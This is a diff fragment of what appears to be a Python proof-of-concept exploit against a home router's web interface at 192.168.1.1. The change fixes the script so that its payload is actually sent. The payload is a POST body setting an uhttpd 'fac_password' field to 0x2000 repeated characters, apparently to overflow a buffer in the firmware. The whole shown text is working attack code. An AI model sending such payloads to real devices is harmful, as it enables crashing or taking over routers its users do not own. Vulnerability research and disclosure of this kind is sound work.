@@ -26,7 +26,7 @@ headers = {
     "Referer": "http://192.168.1.1/"
 }
 # Request body - Vulnerability exploits json
-{"uhttpd":{"webPwd":{"password":"a","fac_password":"a"*0x2000}},"method":"set"}
+data={"uhttpd":{"webPwd":{"password":"a","fac_password":"a"*0x2000}},"method":"set"}
 # Send POST request
 response = requests.post(url, headers=headers, json=data)
 # Output response content
